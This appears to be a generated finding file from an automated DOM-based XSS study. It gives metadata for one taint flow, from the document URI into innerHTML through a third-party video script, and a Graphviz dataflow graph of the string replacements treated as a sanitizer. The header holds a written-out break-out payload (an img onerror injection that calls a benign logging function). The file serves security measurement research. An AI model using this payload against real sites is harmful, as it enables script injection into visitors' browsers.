@@ -1,0 +1,152 @@
+// Finding: 15310c4d-919d-4fce-997d-c1a824873dcd
+// Finding.url: https://www.example257.com/cat/detail/ultra-hd-4k-led-televizor-43-samsung-ue43tu7570u/#"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('e2c6affdf5ec49e4a132fe73102b26f4')><!--/*
+// Finding.parentloc: https://www.example257.com/cat/detail/ultra-hd-4k-led-televizor-43-samsung-ue43tu7570u/#"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('e2c6affdf5ec49e4a132fe73102b26f4')><!--/*
+// Finding.domain: www.example257.com
+// Finding.base_domain: example257.com
+// Finding.source: document.documentURI
+// Finding.sink: innerHTML
+// Sanitizer.score: 4
+// Sanitizer.name: FlixjQ.fn.video.createJWIframe/<
+// Sanitizer.location: https://media.example453.com/delivery/static/jwplayer/js/video.js - FlixjQ.fn.video.createJWIframe/<:426:26
+// Finding.begin: 931
+// Finding.end: 936
+// Finding.original_uuid: c2a02d6c-659d-439d-93a6-6128594f4902
+// Finding.TwentyFiveMillionFlowsId: -1950641193
+// Finding.script: https://media.example453.com/delivery/js/inpage/594/ru/mpn/UE43TU7570UXRU?&=594&=ru&mpn=UE43TU7570UXRU&brand=samsung&ssl=1&ext=.js
+// Finding.line: 1
+// Exploit.uuid: e2c6affd-f5ec-49e4-a132-fe73102b26f4
+// Exploit.success: false
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: href
+// Exploit.quote_type: "
+// Exploit.tag: a
+// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: #"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 6
+// Exploit.replace_begin_url: 84
+// Exploit.replace_end_url: 84
+// Exploit.replace_begin_param: 15
+// Exploit.replace_end_param: 15
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: true
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: 445716695
+// DepGraph.sanitizer_hash: -794338783
+// Removed LR concats 
+// Removed LR concats 
+// Removed LR concats 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="substr"];
+n2 [shape=box, label="Var: x"];
+n3 [shape=box, label="Lit: 0"];
+n4 [shape=box, label="Lit: 84"];
+n5 [shape=ellipse, label="preg_replace"];
+n6 [shape=box, label="RegExp: /[&]/"];
+n7 [shape=box, label="Lit: |and"];
+n8 [shape=box, label="Var: x"];
+n9 [shape=ellipse, label="."];
+n10 [shape=box, label="Lit: |for"];
+n11 [shape=ellipse, label="preg_replace"];
+n12 [shape=box, label="RegExp: /\/\//"];
+n13 [shape=box, label="Lit: |for"];
+n14 [shape=box, label="Var: x"];
+n15 [shape=ellipse, label="preg_replace"];
+n16 [shape=box, label="RegExp: /\?/"];
+n17 [shape=box, label="Lit: |que"];
+n18 [shape=box, label="Var: x"];
+n19 [shape=ellipse, label="."];
+n20 [shape=box, label="Lit: |dub"];
+n21 [shape=ellipse, label="preg_replace"];
+n22 [shape=box, label="RegExp: /\:/"];
+n23 [shape=box, label="Lit: |dub"];
+n24 [shape=box, label="Var: x"];
+n25 [shape=ellipse, label="preg_replace"];
+n26 [shape=box, label="RegExp: /\=/"];
+n27 [shape=box, label="Lit: |is"];
+n28 [shape=box, label="Var: x"];
+n29 [shape=ellipse, label="preg_replace"];
+n30 [shape=box, label="RegExp: /\#/"];
+n31 [shape=box, label="Lit: |hash"];
+n32 [shape=box, label="Var: x"];
+n33 [shape=ellipse, label="preg_replace"];
+n34 [shape=box, label="RegExp: /\%/"];
+n35 [shape=box, label="Lit: |per"];
+n36 [shape=box, label="Var: x"];
+n37 [shape=ellipse, label="."];
+n38 [shape=box, label="Lit: &pn="];
+n39 [shape=ellipse, label="."];
+n40 [shape=box, label="Lit: &vidno=undefined&p=1831657&d=594&l=ru&sid=3AB77429-6A7A-6D57-1....ean=&base=//media.example453.com&gvid=flix608eeaa8000000.87338440"];
+n41 [shape=ellipse, label="."];
+n42 [shape=box, label="Lit: <div class="flix-videodiv " style="position:relative; padding-....ft"><iframe id="flix-iframe0" title="Flix-media-video-0" src=""];
+n43 [shape=ellipse, label="."];
+n44 [shape=box, label="Lit: " width="100%" height="100%" frameborder="0" scrolling="no" al....lute; overflow:hidden; min-width:100%; left:0"></iframe></div>"];
+n45 [shape=box, label="Var: x"];
+n46 [shape=doubleoctagon, label="Return: x"];
+n2 -> n0;
+n1 -> n2;
+n1 -> n3;
+n1 -> n4;
+n8 -> n1;
+n5 -> n6;
+n5 -> n7;
+n5 -> n8;
+n9 -> n5;
+n9 -> n10;
+n14 -> n9;
+n11 -> n12;
+n11 -> n13;
+n11 -> n14;
+n18 -> n11;
+n15 -> n16;
+n15 -> n17;
+n15 -> n18;
+n19 -> n15;
+n19 -> n20;
+n24 -> n19;
+n21 -> n22;
+n21 -> n23;
+n21 -> n24;
+n28 -> n21;
+n25 -> n26;
+n25 -> n27;
+n25 -> n28;
+n32 -> n25;
+n29 -> n30;
+n29 -> n31;
+n29 -> n32;
+n36 -> n29;
+n33 -> n34;
+n33 -> n35;
+n33 -> n36;
+n37 -> n38;
+n37 -> n33;
+n39 -> n40;
+n39 -> n37;
+n41 -> n42;
+n41 -> n39;
+n43 -> n41;
+n43 -> n44;
+n45 -> n43;
+n46 -> n45;
+}
